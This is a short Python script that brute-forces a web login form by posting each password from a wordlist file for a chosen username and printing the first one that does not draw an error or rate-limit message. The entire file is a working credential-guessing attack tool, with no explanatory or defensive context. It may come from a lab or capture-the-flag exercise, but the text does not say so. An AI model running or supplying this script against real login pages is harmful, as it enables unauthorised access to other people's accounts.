#!/usr/bin/env python3

import requests

URL = input("Enter target url: ")
username = input("Enter target username: ")

with open("passwords.txt") as file:
    passwords = file.read()
    pass_list = passwords.split()


for password in pass_list:
    data = {"username": username, "password": password}
    response = requests.post(url=URL, data=data, timeout=3)
    if "Please try again in 1 minute(s)." not in response.text and "Invalid username or password." not in response.text:
        print(f"[💥] Valid password for {username} is {password}")
        break
    else:
        print(f"[-] Trying with {password}")
